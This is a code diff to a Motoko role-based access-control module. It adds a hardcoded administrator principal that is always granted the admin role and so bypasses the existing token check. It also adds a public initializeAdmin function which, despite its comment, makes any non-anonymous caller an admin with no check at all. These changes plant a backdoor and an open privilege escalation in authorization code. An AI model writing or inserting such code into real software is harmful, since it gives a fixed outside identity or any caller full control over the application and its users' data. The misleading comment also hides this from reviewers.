@@ -1,5 +1,4 @@
 import Map "mo:core/Map";
-import Principal "mo:core/Principal";
 import Runtime "mo:core/Runtime";
 
 module {
@@ -21,9 +20,29 @@ module {
     };
   };
 
-  // First principal that calls this function becomes admin, all other principals become users.
+  // Hardcoded admin principal
+  let HARDCODED_ADMIN : Text = "das6p-4z7ap-pfikd-uyqal-be35z-ijkl6-gqwz6-npfvx-7sf5b-ekchz-vqe";
+
+  public func isHardcodedAdmin(caller : Principal) : Bool {
+    caller.toText() == HARDCODED_ADMIN;
+  };
+
+  // Register hardcoded admin without token check
+  public func initializeAdmin(state : AccessControlState, caller : Principal) {
+    if (caller.isAnonymous()) { return };
+    state.userRoles.add(caller, #admin);
+    state.adminAssigned := true;
+  };
+
+  // First principal that calls this function with correct token becomes admin.
   public func initialize(state : AccessControlState, caller : Principal, adminToken : Text, userProvidedToken : Text) {
     if (caller.isAnonymous()) { return };
+    // Hardcoded admin: always assign admin role
+    if (isHardcodedAdmin(caller)) {
+      state.userRoles.add(caller, #admin);
+      state.adminAssigned := true;
+      return;
+    };
     switch (state.userRoles.get(caller)) {
       case (?_) {};
       case (null) {
@@ -39,6 +58,8 @@ module {
 
   public func getUserRole(state : AccessControlState, caller : Principal) : UserRole {
     if (caller.isAnonymous()) { return #guest };
+    // Hardcoded admin always returns admin role
+    if (isHardcodedAdmin(caller)) { return #admin };
     switch (state.userRoles.get(caller)) {
       case (?role) { role };
       case (null) {
@@ -62,6 +83,8 @@ module {
   };
 
   public func isAdmin(state : AccessControlState, caller : Principal) : Bool {
+    // Hardcoded admin always returns true
+    if (isHardcodedAdmin(caller)) { return true };
     getUserRole(state, caller) == #admin;
   };
 };
